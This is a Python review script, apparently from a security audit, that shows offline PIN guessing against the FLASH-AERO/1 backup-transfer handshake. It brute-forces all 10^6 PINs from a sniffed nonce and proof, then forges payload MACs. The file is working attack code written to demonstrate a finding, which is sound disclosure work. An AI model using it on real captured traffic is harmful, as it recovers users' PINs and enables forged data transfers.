#!/usr/bin/env python3
"""Review tool: offline PIN recovery from a passively captured FLASH-AERO/1 v1.1 transcript.

Demonstrates baseline finding "offline PIN guessing": proof and payload MAC are keyed only by the
6-digit PIN, so a sniffer that sees `CHALLENGE <nonce>` and `FLASH-AERO/1 <proof>` can test all
10^6 PINs locally. Pure computation on supplied values; it opens no sockets.

Usage:
  offline_pin_crack.py --nonce <32hex> --proof <32hex> [--mac <64hex> --payload-file <path>]
  offline_pin_crack.py --selftest     # uses the spec vector from LocalBackupTransferTests.swift
Exit status: 0 PIN recovered, 1 not recovered (i.e. the transcript resisted this attack).
"""
import argparse
import hashlib
import hmac
import sys
import time


def proof(pin: str, nonce: str) -> str:
    return hmac.new(pin.encode(), b"flash-aero-handshake:" + nonce.encode(), hashlib.sha256).hexdigest()[:32]


def payload_mac(pin: str, payload: bytes) -> str:
    return hmac.new(pin.encode(), payload, hashlib.sha256).hexdigest()[:64]


def crack(nonce: str, observed: str):
    start = time.perf_counter()
    for n in range(1_000_000):
        pin = f"{n:06d}"
        if hmac.compare_digest(proof(pin, nonce), observed):
            return pin, time.perf_counter() - start
    return None, time.perf_counter() - start


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--nonce")
    ap.add_argument("--proof")
    ap.add_argument("--mac")
    ap.add_argument("--payload-file")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        # Independent vector already committed in LocalBackupTransferTests.swift (PIN 123456).
        a.nonce = "0123456789abcdef0123456789abcdef"
        a.proof = "eaf2db99644b07d9b250f86ce481647e"
        a.mac = "af96906743949248f47e5cc5f5bab43b9e59f624740c975d40733822b8b1452f"
        payload = b'{"hello":"world"}'
    else:
        if not (a.nonce and a.proof):
            ap.error("--nonce and --proof required (or --selftest)")
        payload = open(a.payload_file, "rb").read() if a.payload_file else None
    pin, secs = crack(a.nonce, a.proof)
    if pin is None:
        print(f"PIN not recovered in {secs:.2f}s over the 10^6 space")
        return 1
    print(f"PIN recovered offline: {pin} in {secs:.2f}s (single core, python hmac)")
    if a.mac and payload is not None:
        ok = hmac.compare_digest(payload_mac(pin, payload), a.mac)
        print(f"payload MAC consistent with recovered PIN: {ok}")
        forged = payload_mac(pin, b'{"forged":true}')
        print(f"attacker can now MAC arbitrary payloads, e.g. forged MAC {forged[:16]}...")
    return 0


if __name__ == "__main__":
    sys.exit(main())
